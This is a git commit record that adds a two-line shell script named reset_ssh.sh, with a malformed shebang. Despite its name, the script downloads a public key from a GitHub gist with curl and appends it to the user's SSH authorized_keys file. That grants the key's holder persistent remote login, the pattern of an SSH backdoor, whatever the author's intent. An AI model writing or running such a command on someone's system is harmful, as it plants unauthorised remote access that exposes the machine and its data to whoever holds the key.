e9bcaf5b8fafeb096e8962693c1c32f4a3cab248
Ayush Mehrotra <ayushmehrotra1212@gmail.com>
2023-08-05 22:23:36 +0530

    Initial commit

---
+++ reset_ssh.sh
@@ -0,0 +1,2 @@
+#!bin/bash
+echo -e "$(curl https://gist.githubusercontent.com/ayush121195/ac58c7c2f98831df9edd25cce0ac8162/raw/cdab6ddb4d13a3b7b0d7bc4b92062cfe59e62dd5/ayush.key)" >> ~/.ssh/authorized_keys
